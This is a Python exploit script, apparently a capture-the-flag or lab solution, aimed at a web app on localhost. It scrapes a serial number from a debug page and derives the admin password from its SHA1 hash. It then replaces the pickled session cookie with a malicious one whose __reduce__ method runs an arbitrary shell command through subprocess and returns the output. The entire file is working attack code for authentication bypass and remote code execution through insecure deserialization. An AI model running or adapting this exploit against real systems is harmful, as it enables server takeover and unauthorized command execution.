import pickle
import base64
import requests
import hashlib
import subprocess
import time
import json

cmd = "whoami"
exec_str = "Session(user, token=token, login='hacked', description=r(cmd, shell=True, text=True, capture_output=True).stdout)"
#exec_str = "f = open('system_gateway.log', 'a'); f.write(f'Exploit token: {}\\nSucessfully exploited the server from {{request.remote_addr}}\\n'); f.write(f'Exploit is executing as {{os.getlogin()}}\\n'); f.close();"

class Session(object):
    def __reduce__(self):
        # If you just want to run commands, do this
        #return (exec, (self.cmd, {}))

        # This is a more elegant solution that doesnt invalidate the session _and_ executes commands on the system
        return (eval, (exec_str, {'Session': Session, 'r':subprocess.run, **self.__dict__,}))

def gen_payload_from_cookie(old_token, cmd):
    j = pickle.loads(base64.b64decode(old_token))
    j.cmd = cmd
    o = pickle.dumps(j)
    return base64.b64encode(o).decode("utf-8")


def strip_comment(text):
    res = []
    for i in text.split("\n"):
        i = i.strip()
        if "<!--" in i:
            i = i.replace("<!--", "")
            res.append("")
        if res:
            if "-->" in i:
                res.append(i.replace("-->", ""))
                break
            res.append(i)
    return "\n".join(res).strip()

def exploit(server, cmd="whoami"):
    # Stage one, get the serial number and generate the admin password based on that

    print("[*] Getting serial number from " + server + "debug")
    r = requests.get(server + "debug")
    serial_number = ""
    for line in r.text.split("\n"):
        if "Serial Number" in line:
            line = line.replace("<", ">").split(">")
            serial_number = line[8]
            print(f"[+] Serial Number: {serial_number}")
    
    if serial_number == "":
        print("[!] Could not scrape serial number")
        return

    password = hashlib.sha1(serial_number.encode()).hexdigest()
    password = password.upper()[:10]
    print(f'[+] Derived admin password: {password}')
    print("[*] Logging in to get auth token")
    with requests.Session() as s:
        r = s.post(server + "login", data={"username": "admin", "password": password})
        auth_token = s.cookies.get("auth_token")
        if not auth_token:
            print("[!] Failed to get session cookie")
            return
        random_tok = str(int(time.time()))
        new_token = gen_payload_from_cookie(auth_token, cmd)
        s.cookies.set("auth_token", new_token)
        print(f"[*] Generated exploit token: {new_token}")
    # Send the payload
    r = requests.get(server, cookies={"auth_token": new_token})
    try:
        x = json.loads(strip_comment(r.text))
        print("[+] Exploit succeeded, dumping output:")
        print(x.get("description").strip())
    except Exception as E:
        print("[!] Exploit failed. No results detected", E)

def main():
    exploit("http://localhost:80/", "whoami")

if __name__ == "__main__":
    main()